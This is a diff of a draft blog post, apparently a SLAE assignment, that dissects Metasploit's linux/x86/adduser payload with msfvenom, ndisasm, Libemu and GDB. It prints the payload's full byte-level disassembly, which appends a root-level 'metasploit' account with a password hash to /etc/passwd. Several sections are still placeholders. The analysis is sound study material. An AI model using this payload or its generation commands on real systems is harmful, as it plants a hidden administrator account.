@@ -64,9 +64,9 @@
 
 													<br><h2>Contents</h2>
 													<a href="#Started" style="color:blue;">Getting Started</a><br>
-													<a href="#Assembly" style="color:blue;">Writing the Assembly</a><br>
-													<a href="#Demonstration" style="color:blue;">Demonstration</a><br>
-													<a href="#Troubleshooting" style="color:blue;">Troubleshooting</a><br>
+													<a href="#Disassembly" style="color:blue;">Dumping the Disassembly</a><br>
+													<a href="#Libemu" style="color:blue;">Libemu Analysis</a><br>
+													<a href="#GDB" style="color:blue;">GDB Analysis</a><br> <!-- Maybe not needed -->
 													<a href="#Thoughts" style="color:blue;">Thoughts and Lessons Learned</a><br><br>
 
 													<p>
@@ -88,51 +88,144 @@
 
 											<p>
 												Next step is to determine what the payload requires. &nbsp;Dump the summary information with the command
-												<code>msfvenom -l linux/x86/adduser --list-options</code>. &nbsp;Note that the basic options take priority. &nbsp;According to the summary, the <i>adduser</i>
+												<code>msfvenom -l linux/x86/adduser --list-options</code>. &nbsp;Note that the basic options take priority and in this case, advanced options are
+												taken care of. &nbsp;According to the summary, the <i>adduser</i>
 												payload creates a user, <i>metasploit</i>, with password, <i>metasploit</i>, and adds it to the admin group.
 											</p>
 											<center><div class="image post"><img src="../images/slae/assignment5/2-adduser-summary.png" alt="" /></div></center><br>
 
 
 
-
-
-
-
-
-
-			<br><section id="Assembly"><h2>Writing the Assembly</h2></section>
+			<br><section id="Disassembly"><h2>Dumping the Disassembly</h2></section>
 
 									<p>
-										&emsp; &emsp;Writing assembly
+										&emsp; &emsp;Dump the disassembly with <i>ndisasm</i> using command <code>msfvenom -p linux/x86/adduser R | ndisasm -u -</code>. &nbsp;The <i>-p</i> option specifies the payload.
+										 &nbsp;<i>R</i> specifies raw output, which is then piped into <i>ndisasm</i>. &nbsp;
+										<a href="https://linux.die.net/man/1/ndisasm" target="_blank" style="color:blue;"><i>ndisasm</i></a> stands for "Netwide Disassembler" and is the companion disassembler for the
+										 <i>nasm</i> assembler used in the previous four blog posts. &nbsp;The <i>-u</i> option specifies 32-bit mode. &nbsp;Finally the single dash is a common UNIX option
+										 which allows <i>ndisasm</i> to
+										<a href="https://stackoverflow.com/questions/8045479/whats-the-magic-of-a-dash-in-command-line-parameters" target="_blank" style="color:blue;">allow input from <i>stdin</i></a>.
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
+									<pre>
+										<code class="x86asm" style=display:block;white-space:pre-wrap>
+00000000  31C9              xor ecx,ecx
+00000002  89CB              mov ebx,ecx
+00000004  6A46              push byte +0x46
+00000006  58                pop eax
+00000007  CD80              int 0x80
+00000009  6A05              push byte +0x5
+0000000B  58                pop eax
+0000000C  31C9              xor ecx,ecx
+0000000E  51                push ecx
+0000000F  6873737764        push dword 0x64777373
+00000014  682F2F7061        push dword 0x61702f2f
+00000019  682F657463        push dword 0x6374652f
+0000001E  89E3              mov ebx,esp
+00000020  41                inc ecx
+00000021  B504              mov ch,0x4
+00000023  CD80              int 0x80
+00000025  93                xchg eax,ebx
+00000026  E828000000        call 0x53
+0000002B  6D                insd
+0000002C  657461            gs jz 0x90
+0000002F  7370              jnc 0xa1
+00000031  6C                insb
+00000032  6F                outsd
+00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
+0000003B  736A              jnc 0xa7
+0000003D  3470              xor al,0x70
+0000003F  3449              xor al,0x49
+00000041  52                push edx
+00000042  633A              arpl [edx],di
+00000044  303A              xor [edx],bh
+00000046  303A              xor [edx],bh
+00000048  3A2F              cmp ch,[edi]
+0000004A  3A2F              cmp ch,[edi]
+0000004C  62696E            bound ebp,[ecx+0x6e]
+0000004F  2F                das
+00000050  7368              jnc 0xba
+00000052  0A598B            or bl,[ecx-0x75]
+00000055  51                push ecx
+00000056  FC                cld
+00000057  6A04              push byte +0x4
+00000059  58                pop eax
+0000005A  CD80              int 0x80
+0000005C  6A01              push byte +0x1
+0000005E  58                pop eax
+0000005F  CD80              int 0x80
+										</code>
+									</pre>
+
+									<p>
+										The above dump is the entire assembly output, which includes multiple calls to <i>int 0x80</i>. &nbsp;0x46 is loaded into <i>eax</i> before calling <i>int 0x80</i>.
+										 &nbsp;This is sytem call number 70, which is <a href="https://man7.org/linux/man-pages/man2/setreuid.2.html" target="_blank" style="color:blue;"><i>setreuid()</i></a> below.
+
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/3-syscall-number.png" alt="" /></div></center><br>
 
 
+			<br><section id="Libemu"><h2>Libemu Analysis</h2></section>
+							<!--
 
+								-->
 
+								<p>
+									&emsp; &emsp;Use Libemu here &nbsp;
+								</p>
+								<center><div class="image post"><img src="../images/slae/assignment5/4-sctest-folder.png" alt="" /></div></center><br>
 
-			<br><section id="Demonstration"><h2>Demonstration</h2></section>
+								<p>
+									After navigating to the folder, run the following command to dump  &nbsp;
+								</p>
+								<center><div class="image post"><img src="../images/slae/assignment5/5-sctest-out.png" alt="" /></div></center><br>
 								<!--
-								OBJDUMP Special Command:
-								objdump -d ./PROGRAM|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-							-->
+								<p>
+									 graphical stuff not used in adduser   &nbsp;
+								</p>
+								<center><div class="image post"><img src="../images/slae/assignment5/6-create-graph.png" alt="" /></div></center><br>
+
+								<p>
+									 Need the sctest graphical stuff here   &nbsp;
+								</p>
+								<center><div class="image post"><img src="../images/slae/assignment5/7-dot-installed.png" alt="" /></div></center><br>
+								-->
+
+
+
+			<br><section id="GDB"><h2>GDB Analysis</h2></section>
 
 									<p>
-										&emsp; &emsp;Demonstrate shellcode here
+										&emsp; &emsp;Debugging and Troubleshooting &nbsp;
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
-
-
-
-
-
-			<br><section id="Debugging"><h2>Debugging</h2></section>
+									<center><div class="image post"><img src="../images/slae/assignment5/6-create-shellcode-again.png" alt="" /></div></center><br>
 
 									<p>
-										&emsp; &emsp;Debugging and Troubleshooting
+										Paste shellcode into C-code harness. &nbsp;
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
+									<center><div class="image post"><img src="../images/slae/assignment5/7-paste-harness-again.png" alt="" /></div></center><br>
+
+									<p>
+										Dump of <i>main()</i> function. &nbsp;
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/8-gdb-main-again.png" alt="" /></div></center><br>
+
+									<p>
+										Entire dump of pasted shellcode after call to <i>eax</i>. &nbsp;
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/9-assembly-dump.png" alt="" /></div></center><br>
+
+									<p>
+										The above dump is the entire assembly output, which includes multiple calls to <i>int 0x80</i>. &nbsp;0x46 is loaded into <i>eax</i> before calling <i>int 0x80</i>.
+										 &nbsp;This is sytem call number 70, which is <a href="https://man7.org/linux/man-pages/man2/setreuid.2.html" target="_blank" style="color:blue;"><i>setreuid()</i></a> below.
+
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/3-syscall-number.png" alt="" /></div></center><br>
+
+									<p>
+										Just before <i>setreuid()</i>&nbsp;
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment5/10-before-syscall.png" alt="" /></div></center><br>
+
 
 
 
@@ -140,7 +233,7 @@
 		<br><section id="Thoughts"><h2>Thoughts and Lessons Learned</h2></section>
 
 									<p>
-										&emsp; &emsp;Conclusion goes here
+										&emsp; &emsp;Conclusion goes here &nbsp;
 									</p>
 									<center><div class="image post"><img src="../images/slae/assignment2/.png" alt="" /></div></center><br>
 
